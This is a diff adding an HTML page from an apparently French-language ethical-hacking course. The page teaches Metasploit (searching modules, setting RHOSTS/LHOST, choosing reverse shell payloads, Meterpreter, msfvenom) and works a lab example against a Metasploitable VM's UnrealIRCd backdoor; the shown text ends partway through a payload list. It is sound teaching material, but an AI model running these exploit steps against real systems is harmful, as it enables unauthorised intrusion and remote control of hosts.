@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="fr-ca" dir="ltr" itemscope itemtype="http://schema.org/Article">
+  <head><script src="/420-513/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=420-513/livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.123.7">
+    <meta name="generator" content="Relearn 6.1.1+tip">
+    <meta name="description" content="Metasploit est une plateforme regroupant divers modules utiles aux différentes phases d’une attaque, plus particulièrement celle de l’exploitation. Elle dispose de ses propres modules et commandes mais on peut aussi y utiliser les commandes habituelles du shell linux (cd, ls, etc.).
+Pour démarrer metasploit, on lance la commande msfconsole :
+┌──(kali㉿kali)-[~] └─$ msfconsoleLa commande help affiche l’aide générale sur les commandes :
+msf6 &gt; helpRecherche de modules Metasploit se compose de différents modules regroupés par catégories dans une arborescence de répertoires : par exemple, un module touchant à l’exploitation d’une vulnérabilité d’un logiciel antivirus sous Windows sera dans le répertoire exploits/windows/antivirus.">
+    <meta name="author" content="">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Metasploit :: 420-513">
+    <meta name="twitter:description" content="Metasploit est une plateforme regroupant divers modules utiles aux différentes phases d’une attaque, plus particulièrement celle de l’exploitation. Elle dispose de ses propres modules et commandes mais on peut aussi y utiliser les commandes habituelles du shell linux (cd, ls, etc.).
+Pour démarrer metasploit, on lance la commande msfconsole :
+┌──(kali㉿kali)-[~] └─$ msfconsoleLa commande help affiche l’aide générale sur les commandes :
+msf6 &gt; helpRecherche de modules Metasploit se compose de différents modules regroupés par catégories dans une arborescence de répertoires : par exemple, un module touchant à l’exploitation d’une vulnérabilité d’un logiciel antivirus sous Windows sera dans le répertoire exploits/windows/antivirus.">
+    <meta property="og:url" content="http://localhost:1313/420-513/automatisation/metasploit/index.html">
+    <meta property="og:site_name" content="420-513">
+    <meta property="og:title" content="Metasploit :: 420-513">
+    <meta property="og:description" content="Metasploit est une plateforme regroupant divers modules utiles aux différentes phases d’une attaque, plus particulièrement celle de l’exploitation. Elle dispose de ses propres modules et commandes mais on peut aussi y utiliser les commandes habituelles du shell linux (cd, ls, etc.).
+Pour démarrer metasploit, on lance la commande msfconsole :
+┌──(kali㉿kali)-[~] └─$ msfconsoleLa commande help affiche l’aide générale sur les commandes :
+msf6 &gt; helpRecherche de modules Metasploit se compose de différents modules regroupés par catégories dans une arborescence de répertoires : par exemple, un module touchant à l’exploitation d’une vulnérabilité d’un logiciel antivirus sous Windows sera dans le répertoire exploits/windows/antivirus.">
+    <meta property="og:locale" content="fr_ca">
+    <meta property="og:type" content="article">
+    <meta property="article:section" content="Automatisation">
+    <meta property="article:published_time" content="2024-11-11T13:48:32-05:00">
+    <meta property="article:modified_time" content="2024-11-11T13:48:32-05:00">
+    <meta itemprop="name" content="Metasploit :: 420-513">
+    <meta itemprop="description" content="Metasploit est une plateforme regroupant divers modules utiles aux différentes phases d’une attaque, plus particulièrement celle de l’exploitation. Elle dispose de ses propres modules et commandes mais on peut aussi y utiliser les commandes habituelles du shell linux (cd, ls, etc.).
+Pour démarrer metasploit, on lance la commande msfconsole :
+┌──(kali㉿kali)-[~] └─$ msfconsoleLa commande help affiche l’aide générale sur les commandes :
+msf6 &gt; helpRecherche de modules Metasploit se compose de différents modules regroupés par catégories dans une arborescence de répertoires : par exemple, un module touchant à l’exploitation d’une vulnérabilité d’un logiciel antivirus sous Windows sera dans le répertoire exploits/windows/antivirus.">
+    <meta itemprop="datePublished" content="2024-11-11T13:48:32-05:00">
+    <meta itemprop="dateModified" content="2024-11-11T13:48:32-05:00">
+    <meta itemprop="wordCount" content="2449">
+    <title>Metasploit :: 420-513</title><link rel="icon" href="/420-513/images/favicon.png" type="image/png">
+    <link href="/420-513/css/fontawesome-all.min.css?1731362681" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/420-513/css/fontawesome-all.min.css?1731362681" rel="stylesheet"></noscript>
+    <link href="/420-513/css/nucleus.css?1731362681" rel="stylesheet">
+    <link href="/420-513/css/auto-complete.css?1731362681" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/420-513/css/auto-complete.css?1731362681" rel="stylesheet"></noscript>
+    <link href="/420-513/css/perfect-scrollbar.min.css?1731362681" rel="stylesheet">
+    <link href="/420-513/css/fonts.css?1731362681" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/420-513/css/fonts.css?1731362681" rel="stylesheet"></noscript>
+    <link href="/420-513/css/theme.css?1731362681" rel="stylesheet">
+    <link href="/420-513/css/theme-red.css?1731362681" rel="stylesheet" id="R-variant-style">
+    <link href="/420-513/css/chroma-learn.css?1731362681" rel="stylesheet" id="R-variant-chroma-style">
+    <link href="/420-513/css/variant.css?1731362681" rel="stylesheet">
+    <link href="/420-513/css/print.css?1731362681" rel="stylesheet" media="print">
+    <script src="/420-513/js/variant.js?1731362681"></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.relBasePath='..\/..';
+      window.relearn.relBaseUri='..\/..\/..';
+      window.relearn.absBaseUri='http:\/\/localhost:1313\/420-513';
+      // variant stuff
+      window.variants && variants.init( [ 'red' ] );
+      // translations
+      window.T_Copy_to_clipboard = `Copy to clipboard`;
+      window.T_Copied_to_clipboard = `Copied to clipboard!`;
+      window.T_Copy_link_to_clipboard = `Copy link to clipboard`;
+      window.T_Link_copied_to_clipboard = `Copied link to clipboard!`;
+      window.T_Reset_view = `Reset view`;
+      window.T_View_reset = `View reset!`;
+      window.T_No_results_found = `No results found for "{0}"`;
+      window.T_N_results_found = `{1} results found for "{0}"`;
+    </script>
+  </head>
+  <body class="mobile-support html disableInlineCopyToClipboard" data-url="/420-513/automatisation/metasploit/index.html">
+    <div id="R-body" class="default-animation">
+      <div id="R-body-overlay"></div>
+      <nav id="R-topbar">
+        <div class="topbar-wrapper">
+          <div class="topbar-sidebar-divider"></div>
+          <div class="topbar-area topbar-area-start" data-area="start">
+            <div class="topbar-button topbar-button-sidebar" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide"><button class="topbar-control" onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)"><i class="fa-fw fas fa-bars"></i></button>
+            </div>
+          </div>
+          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li
+            itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><a itemprop="item" href="/420-513/index.html"><span itemprop="name">Piratage éthique</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li
+            itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><a itemprop="item" href="/420-513/automatisation/index.html"><span itemprop="name">Automatisation</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li
+            itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><span itemprop="name">Metasploit</span><meta itemprop="position" content="3"></li>
+          </ol>
+          <div class="topbar-area topbar-area-end" data-area="end">
+            <div class="topbar-button topbar-button-more" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show"><button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+                  <div class="topbar-area topbar-area-more" data-area="more">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <div id="R-main-overlay"></div>
+      <main id="R-body-inner" class="highlightable default" tabindex="-1">
+        <div class="flex-block-wrapper">
+          <article class="default">
+            <header class="headline">
+            </header>
+
+<h1 id="metasploit">Metasploit</h1>
+
+<p>Metasploit est une plateforme regroupant divers modules utiles aux différentes phases d’une attaque, plus particulièrement celle de l’exploitation. Elle dispose de ses propres modules et commandes mais on peut aussi y utiliser les commandes habituelles du shell linux (<code>cd</code>, <code>ls</code>, etc.).</p>
+<p>Pour démarrer metasploit, on lance la commande <code>msfconsole</code> :</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ msfconsole</span></span></code></pre></div><p>La commande <code>help</code> affiche l’aide générale sur les commandes :</p>
+<div class="highlight wrap-code"><pre tabindex="0"><code>msf6 &gt; help</code></pre></div><h2 id="recherche-de-modules">Recherche de modules</h2>
+<p>Metasploit se compose de différents modules regroupés par catégories dans une arborescence de
+répertoires : par exemple, un module touchant à l’exploitation d’une vulnérabilité d’un logiciel antivirus sous Windows sera dans le répertoire <code>exploits/windows/antivirus</code>. En raison du grand nombre de modules disponibles, il peut être difficile de s’y retrouver; la commande <code>search</code> permet de chercher un module en fonction d’un mot-clé dans le répertoire ou la
+description du module. Par exemple pour chercher un module contenant le terme “tcp”:</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 &gt; search tcp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    Name                             Disclosure Date  Rank       Check  Description</span>
+</span></span><span style="display:flex;"><span>-    ----                             ---------------  ----       -----  -----------
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>    auxiliary/scanner/portscan/tcp                    normal     No     TCP Port Scanner</span></span></code></pre></div><p>Les options de recherche sont nombreuses: par exemple il est possible de rechercher un module par identifiant CVE, par type de module (<em>exploit</em>, <em>auxiliary</em>, etc.), trier les résultats par date&hellip; Consultez l&rsquo;aide en ligne en <code>help search</code> pour les connaître. Par exemple, pour chercher les modules d&rsquo;exploitation pour <em>Windows</em> comprenant le terme &ldquo;uac&rdquo; et les trier par date :</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 &gt; search uac type:exploit platform:windows -s date</span></span></code></pre></div><p>Un petit truc: il est aussi possible de combiner les termes de recherche en utilisant <code>grep</code>, comme suit:</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 &gt; grep TCP search scanner
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>    auxiliary/scanner/dcerpc/tcp_dcerpc_auditor      normal  No     DCERPC TCP Service Auditor
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>    auxiliary/scanner/pcanywhere/pcanywhere_tcp      normal  No     PcAnywhere TCP Service 
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>    auxiliary/scanner/sip/options_tcp                normal  No     SIP Endpoint Scanner <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>    auxiliary/scanner/sip/enumerator_tcp             normal  No     SIP Username Enumerator </span></span></code></pre></div><blockquote>
+<p>Les modules Metasploit sont des scripts <em>ruby</em> qui se trouvent dans le répertoire <em>/usr/share/metasploit-framework/modules</em> sur Kali. Il est possible de faire une recherche des modules sans démarrer Metasploit, en utilisant la commande <code>searchsploit</code> dans linux.</p>
+</blockquote>
+<h2 id="options-des-modules">Options des modules</h2>
+<p>Chaque module a un ensemble d&rsquo;options de configuration (certaines obligatoires, d&rsquo;autres facultatives) dont on spécifie la valeur avant de lancer l&rsquo;attaque. Par exemple, si un module permet de créer un <em>shell</em> inversé entre la cible et Kali, il y aura deux options pour spécifier les adresses IP de la cible et celle de Kali.</p>
+<h3 id="payloads">&ldquo;Payloads&rdquo;</h3>
+<p>Dans plusieurs cas, une des options à définir est la &ldquo;charge utile&rdquo;, aussi appelée <em>payload</em>. C&rsquo;est le fichier ou l&rsquo;information qui doit être transmise pour réaliser l&rsquo;exploitation. Les modules utilisés dans les phases d&rsquo;exploitation utilisent généralement un payload: par exemple, si on tente d&rsquo;exploiter une vulnérabilité qui permet de téléverser un fichier, alors c&rsquo;est ce fichier qui sera le payload.</p>
+<p>Metasploit inclut de nombreux payloads, et pour chaque module Metasploit il y a généralement plusieurs payloads qui sont compatibles. La grande majorité des payloads sont des shells inversés.</p>
+<h4 id="meterpreter">Meterpreter</h4>
+<p><em>Meterpreter</em> est un payload très versatile, souvent utilisé dans Metasploit: c&rsquo;est un shell auquel on a ajouté plusieurs fonctionnalités utiles dans un contexte de post-exploitation. Il permet à un attaquant d&rsquo;obtenir un accès avancé à une machine compromise afin d&rsquo;effectuer diverses actions: téléchargement de fichiers, extraction d&rsquo;informations, exécution de commandes, pivotement vers d&rsquo;autres réseaux, etc.</p>
+<p>Un des avantages de Meterpreter est qu&rsquo;il s&rsquo;exécute en mémoire, donc n&rsquo;est pas écrit sur l&rsquo;espace de stockage de la victime. Ceci rend sa détection plus difficile pour les logiciels antivirus. Il utilise aussi des techniques d&rsquo;encodage pour masquer ses activités et communique avec la machine de l&rsquo;attaquant via des canaux chiffrés, rendant la surveillance du trafic réseau plus complexe.</p>
+<h3 id="configuration">Configuration</h3>
+<p>Lorsqu&rsquo;on a trouvé un module qui correspond à ce dont on a besoin, on peut l&rsquo;utiliser avec la commande <code>use</code>. On peut désigner le module par son nom ou son numéro. La commande <code>show info</code> permet ensuite d&rsquo;afficher toutes les informations sur le module:</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 &gt; use exploit/unix/ftp/proftpd_modcopy_exec
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/ftp/proftpd_modcopy_exec<span style="color:#f92672">)</span> &gt; show info
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       Name: ProFTPD-1.3.3c Backdoor Command Execution
+</span></span><span style="display:flex;"><span>     Module: exploit/unix/ftp/proftpd_modcopy_exec
+</span></span><span style="display:flex;"><span>   Platform: Unix
+</span></span><span style="display:flex;"><span>       Arch: cmd
+</span></span><span style="display:flex;"><span> Privileged: Yes
+</span></span><span style="display:flex;"><span>    License: Metasploit Framework License <span style="color:#f92672">(</span>BSD<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>       Rank: Excellent
+</span></span><span style="display:flex;"><span>  Disclosed: 2010-12-02
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>...<span style="color:#f92672">)</span></span></span></code></pre></div><p>Les <em>options</em> d’un module sont les paramètres qui doivent être définis avant de le lancer. Ces paramètres font partie des informations affichées par <code>show info</code>, mais on peut également les voir avec la commande <code>show options</code> :</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/ftp/proftpd_modcopy_exec<span style="color:#f92672">)</span> &gt; show options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/unix/ftp/proftpd_modcopy_exec<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name    Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----    ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   RHOSTS                   yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, range CIDR identifier, or hosts file 
+</span></span><span style="display:flex;"><span>   RPORT   <span style="color:#ae81ff">21</span>               yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span></span></span></code></pre></div><p>Avant d’exécuter le module, il faut que les options obligatoires (« required ») aient une valeur; on définit cette valeur avec la commande <code>set</code>. Ici <strong>RHOSTS</strong> (l’adresse de la cible) est manquante. Pour la spécifier on entre la commande suivante:</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/ftp/proftpd_modcopy_exec<span style="color:#f92672">)</span> &gt; set rhosts 192.168.229.132</span></span></code></pre></div><p>Ici, le module choisi n’a pas de « payload » par défaut.  La commande <code>show payloads</code> permet de voir lesquels sont compatibles :</p>
+<p>msf6 exploit(unix/ftp/proftpd_modcopy_exec) &gt; show payloads</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Compatible Payloads
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  Name                                             Rank    Check  Description</span>
+</span></span><span style="display:flex;"><span>-  ----                                             ----    -----  -----------
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>  payload/cmd/unix/bind_awk                        normal  No     Unix Command Shell,              
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>  payload/cmd/unix/bind_perl                       normal  No     Unix Command Shell,    
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>  payload/cmd/unix/bind_perl_ipv6                  normal  No     Unix Command Shell,    
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>  payload/cmd/unix/generic                         normal  No     Unix Command,    
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span>  payload/cmd/unix/reverse_awk                     normal  No     Unix Command Shell,    
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span>  payload/cmd/unix/reverse_perl                    normal  No     Unix Command Shell,    
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>  payload/cmd/unix/reverse_perl_ssl                normal  No     Unix Command Shell,    
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7</span>  payload/cmd/unix/reverse_python                  normal  No     Unix Command Shell,    
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">8</span>  payload/cmd/unix/reverse_python_ssl              normal  No     Unix Command Shell, </span></span></code></pre></div><p>On choisira le shell inversé <em>perl</em>, comme suit :</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/ftp/proftpd_modcopy_exec<span style="color:#f92672">)</span> &gt; set payload <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span>&gt; cmd/unix/reverse_perl</span></span></code></pre></div>
+<div class="box notices cstyle warning">
+  <div class="box-label"><i class="fa-fw fas fa-exclamation-triangle"></i> Payloads</div>
+  <div class="box-content">
+
+<p>Le <em>payload</em> désigne la charge utile, le programme que l&rsquo;exploitation nous permet d&rsquo;exécuter. Par exemple lorsqu&rsquo;on exploite une vulnérabilité de type <em>exécution de code</em>, une fois l&rsquo;exploitation réalisée ce qu&rsquo;on souhaite c&rsquo;est exécuter un programme sur la cible. Cela peut être une commande du système distant ou encore un script conçu par nous-mêmes. Si on choisit la deuxième option, c&rsquo;est ce script qui sera la <em>payload</em>.</p>
+</div>
+</div>
+<p>La commande <code>show options</code> nous permet de revoir les options auxquelles se sont ajoutées celles du payload :</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/ftp/proftpd_modcopy_exec<span style="color:#f92672">)</span> &gt; show options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>...<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>cmd/unix/reverse_perl<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name   Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----   ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   LHOST                   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port</span></span></code></pre></div><p>L’option <strong>LHOST</strong> doit correspondre à l’adresse de l&rsquo;attaquant (Kali) :</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/ftp/proftpd_modcopy_exec<span style="color:#f92672">)</span> &gt; set lhost 192.168.229.129
+</span></span><span style="display:flex;"><span>lhost <span style="color:#f92672">=</span>&gt; 192.168.229.129</span></span></code></pre></div><p>Lorsque toutes les options sont correctement configurées et qu&rsquo;on est prêt à lancer l&rsquo;attaque, on utilise la commande <code>run</code>.</p>
+<h3 id="_msfvenom_"><em>msfvenom</em></h3>
+<p>Parfois il est possible qu&rsquo;une attaque ne puisse pas être réalisée directement via Metasploit, mais on souhaite quand même utiliser un module qui en fait partie. <em>Msfvenom</em> peut alors être utilisé pour générer des payloads personnalisés qui peuvent prendre plusieurs formes: fichiers d&rsquo;exploitation, <em>shellcodes</em>, etc. On peut donc par exemple créer un fichier exécutable qui contient le module <code>payload/windows/x64/shell/reverse_tcp</code>, et si on trouve le moyen de faire exécuter ce fichier sur la machine cible, celle-ci tentera d&rsquo;établir un shell inversé sur Kali, sans quon ait besoin d&rsquo;utiliser Metasploit.</p>
+<p><em>Msfvenom</em> est donc un programme complémentaire à Metasploit qui permet d&rsquo;utiliser les fonctionnalités de création de payload de Metasploit à l&rsquo;extérieur de celui-ci.</p>
+<h2 id="exemple-dutilisation-de-metasploit">Exemple d&rsquo;utilisation de Metasploit</h2>
+
+<div class="box notices cstyle warning">
+  <div class="box-label"><i class="fa-fw fas fa-exclamation-triangle"></i> Préalables</div>
+  <div class="box-content">
+
+<p>Pour faire cet exemple, vous devez avoir installé la VM <em>Metasploitable</em> conformément aux directives décrites ici : <a href="https://github.com/rapid7/metasploitable3/" rel="external" target="_blank">https://github.com/rapid7/metasploitable3/</a>.</p>
+</div>
+</div>
+<h3 id="énumération">Énumération</h3>
+<p>La première étape est de lancer <code>nmap</code> sur la cible afin de voir quels services pourraient être vulnérables. On détecte les services suivants :</p>
+<div class="highlight wrap-code"><pre tabindex="0"><code>PORT     STATE  SERVICE     VERSION
+21/tcp   open   ftp         ProFTPD 1.3.5
+22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 
+80/tcp   open   http        Apache httpd 2.4.7
+445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+631/tcp  open   ipp         CUPS 1.7
+3000/tcp closed ppp
+3306/tcp open   mysql       MySQL (unauthorized)
+3500/tcp closed rtmp-port
+6697/tcp open   irc         UnrealIRCd
+8080/tcp open   http        Jetty 8.1.7.v20120910
+8181/tcp closed intermapper</code></pre></div><h3 id="port-6697">Port 6697</h3>
+<p>Avec <code>searchsploit</code> on peut constater qu’il existe une vulnérabilité sur la version 3.2.8.1 de <em>UnrealIRCd</em> et qu’il existe un module Metasploit correspondant (le fichier <code>16922.rb</code>):</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ searchsploit unreal
+</span></span><span style="display:flex;"><span>---------------------------------------------------------------------- ---------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                        |  Path
+</span></span><span style="display:flex;"><span>---------------------------------------------------------------------- ---------------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>...<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Unreal Tournament <span style="color:#ae81ff">3</span> 1.3 - Directory Traversal                         | windows/remote/6506.txt
+</span></span><span style="display:flex;"><span>Unreal Tournament <span style="color:#ae81ff">3</span> 2.1 - <span style="color:#e6db74">&#39;STEAMBLOB&#39;</span> Remote Denial of Service        | windows/dos/14414.txt
+</span></span><span style="display:flex;"><span>UnrealIRCd 3.2.8.1 - Backdoor Command Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>          | linux/remote/16922.rb
+</span></span><span style="display:flex;"><span>UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow               | windows/dos/18011.txt
+</span></span><span style="display:flex;"><span>UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                        | linux/remote/13853.pl
+</span></span><span style="display:flex;"><span>UnrealIRCd 3.x - Remote Denial of Service                             | windows/dos/27407.pl
+</span></span><span style="display:flex;"><span>---------------------------------------------------------------------- ------------------------------</span></span></code></pre></div>
+<div class="box notices cstyle warning">
+  <div class="box-label"><i class="fa-fw fas fa-exclamation-triangle"></i> Remarque</div>
+  <div class="box-content">
+
+<p>La commande <code>searchsploit</code> permet d&rsquo;interroger à partir de la ligne de commande la base de données du site <a href="https://www.exploit-db.com/" rel="external" target="_blank">Exploit-DB</a>. Les fichiers dans la colonne <strong>Path</strong> se trouvent dans <code>/usr/share/exploitdb/exploits</code> sur Kali.</p>
+</div>
+</div>
+<p>On lance donc <code>msfconsole</code>; ensuite on cherche le module et on le charge :</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 &gt; search unreal
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                        Disclosure Date  Rank       Check  Description</span>
+</span></span><span style="display:flex;"><span>   -  ----                                        ---------------  ----       -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  exploit/linux/games/ut2004_secure           2004-06-18       good       Yes    Unreal 
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>  exploit/windows/games/ut2004_secure         2004-06-18       good       Yes    Unreal 
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 &gt; use <span style="color:#ae81ff">2</span></span></span></code></pre></div><p>On fait ensuite <code>show payloads</code> et on choisit un des <em>shells</em> inversés proposés, <code>payload/cmd/unix/reverse</code> :</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/irc/unreal_ircd_3281_backdoor<span style="color:#f92672">)</span> &gt; show payloads
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Compatible Payloads
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#   Name                                        Disclosure Date  Rank    Check  Description</span>
+</span></span><span style="display:flex;"><span>   -   ----                                        ---------------  ----    -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   payload/cmd/unix/bind_perl                                   normal  No     Unix Command ,     
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>   payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command    
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>   payload/cmd/unix/bind_ruby                                   normal  No     Unix Command    
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>   payload/cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command    
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>   payload/cmd/unix/generic                                     normal  No     Unix Command,    
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span>   payload/cmd/unix/reverse                                     normal  No     Unix Command    
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span>   payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command    
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span>   payload/cmd/unix/reverse_perl                                normal  No     Unix Command 
+</span></span><span style="display:flex;"><span>
